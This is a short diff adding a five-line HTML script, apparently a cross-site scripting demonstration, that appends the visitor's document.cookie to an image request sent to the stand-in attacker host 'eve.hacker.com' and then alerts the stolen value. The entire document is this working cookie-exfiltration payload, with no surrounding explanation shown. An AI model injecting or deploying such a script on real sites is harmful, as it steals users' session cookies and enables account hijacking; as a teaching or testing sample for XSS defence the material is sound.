@@ -1,0 +1,5 @@
+<script>
+    var img = new Image;
+    img.src = "http://eve.hacker.com/" + document.cookie;
+    alert("Got your sessionId -" + img.src);
+</script>
